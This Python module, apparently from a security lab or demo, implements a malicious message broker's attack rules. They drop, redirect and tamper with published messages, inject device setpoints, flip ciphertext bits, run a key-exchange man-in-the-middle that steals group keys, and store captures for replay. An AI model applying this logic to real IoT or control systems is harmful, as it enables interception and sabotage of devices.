"""Attack rules the evil broker applies to client -> broker PUBLISH packets,
plus the capture store used for replay."""

from __future__ import annotations

import itertools
import json
import threading
import time
from collections import deque
from dataclasses import asdict, dataclass, field

from evilbroker.mitm_dh import DhMitm
from evilbroker.wire import Publish
from securelib.message import peek_header


@dataclass
class Rules:
    drop: set[str] = field(default_factory=set)
    redirect: dict[str, str] = field(default_factory=dict)  # from topic -> to topic
    modify: dict[str, float] = field(default_factory=dict)  # topic -> injected setpoint
    mitm: dict[str, DhMitm] = field(default_factory=dict)  # device -> key-exchange MITM

    def clear(self) -> None:
        self.drop.clear()
        self.redirect.clear()
        self.modify.clear()
        self.mitm.clear()

    def as_dict(self) -> dict:
        return {
            "drop": sorted(self.drop),
            "redirect": dict(self.redirect),
            "modify": dict(self.modify),
            "mitm_dh": sorted(self.mitm),
        }

    def apply_mitm(self, p: Publish) -> tuple[Publish, str | None]:
        """Attack 6: rewrite key-exchange messages of an armed victim."""
        parts = p.topic.split("/")
        if len(parts) != 3 or parts[0] != "kdc" or parts[2] not in self.mitm:
            return p, None
        m = self.mitm[parts[2]]
        try:
            msg = json.loads(p.payload)
        except (UnicodeDecodeError, json.JSONDecodeError):
            return p, None
        kind = msg.get("t")
        handler = {"hello": m.on_hello, "challenge": m.on_challenge, "key": m.on_key}.get(kind)
        if handler is None:
            return p, None
        before = len(m.learned)
        new = handler(msg)
        note = f"MITM key exchange: rewrote {kind} for {parts[2]}"
        if len(m.learned) > before:
            note += f" — STOLE group key for epoch {max(m.learned)}"
        return p.with_(payload=json.dumps(new, separators=(",", ":")).encode()), note

    def apply(self, p: Publish) -> tuple[Publish | None, str | None]:
        """Return (publish to forward or None if dropped, description of what was done)."""
        if self.mitm and p.topic.startswith("kdc/"):
            return self.apply_mitm(p)
        if p.topic in self.drop:
            return None, f"DROPPED {p.topic}"
        note = None
        if p.topic in self.modify:
            new_payload, what = tamper_payload(p.payload, self.modify[p.topic])
            p = p.with_(payload=new_payload)
            note = f"MODIFIED {p.topic}: {what}"
        if p.topic in self.redirect:
            target = self.redirect[p.topic]
            note = (note + "; " if note else "") + f"REDIRECTED {p.topic} -> {target}"
            p = p.with_(topic=target)
        return p, note


def tamper_payload(payload: bytes, setpoint: float) -> tuple[bytes, str]:
    """Change the setpoint if the payload is readable JSON; otherwise flip one bit
    (the best a broker can do against ciphertext)."""
    try:
        body = json.loads(payload)
    except (UnicodeDecodeError, json.JSONDecodeError):
        body = None
    if isinstance(body, dict) and "setpoint" in body:
        old = body["setpoint"]
        body["setpoint"] = setpoint
        return json.dumps(body, separators=(",", ":")).encode(), f"setpoint {old} -> {setpoint}"
    if not payload:
        return payload, "empty payload, nothing to change"
    i = len(payload) // 2
    flipped = bytearray(payload)
    flipped[i] ^= 0x01
    return bytes(flipped), f"flipped 1 bit at byte {i} (payload unreadable)"


def extract_seq(payload: bytes) -> int | None:
    """Sequence number as visible to the broker: the plaintext envelope field, or
    the clear header of a sealed message."""
    header = peek_header(payload) if payload[:1] == b"\x01" else None
    if header is not None:
        return header.seq
    try:
        body = json.loads(payload)
    except (UnicodeDecodeError, json.JSONDecodeError):
        return None
    seq = body.get("seq") if isinstance(body, dict) else None
    return seq if isinstance(seq, int) else None


@dataclass(frozen=True)
class Capture:
    id: int
    ts: float
    client: str
    topic: str
    payload: bytes
    qos: int
    retain: bool
    seq: int | None

    def summary(self) -> dict:
        d = asdict(self)
        d.pop("payload")
        d["size"] = len(self.payload)
        return d


class CaptureStore:
    """Ring buffer of every PUBLISH the broker received (before any rule)."""

    def __init__(self, maxlen: int = 2000) -> None:
        self._items: deque[Capture] = deque(maxlen=maxlen)
        self._ids = itertools.count(1)
        self._lock = threading.Lock()

    def add(self, client: str, p: Publish) -> Capture:
        with self._lock:
            cap = Capture(
                id=next(self._ids),
                ts=time.time(),
                client=client,
                topic=p.topic,
                payload=p.payload,
                qos=p.qos,
                retain=p.retain,
                seq=extract_seq(p.payload),
            )
            self._items.append(cap)
            return cap

    def clear(self) -> None:
        with self._lock:
            self._items.clear()

    def find(self, topic: str | None = None, seq: int | None = None) -> list[Capture]:
        with self._lock:
            items = list(self._items)
        return [
            c
            for c in items
            if (topic is None or c.topic == topic) and (seq is None or c.seq == seq)
        ]

    def get(self, capture_id: int) -> Capture | None:
        with self._lock:
            return next((c for c in self._items if c.id == capture_id), None)
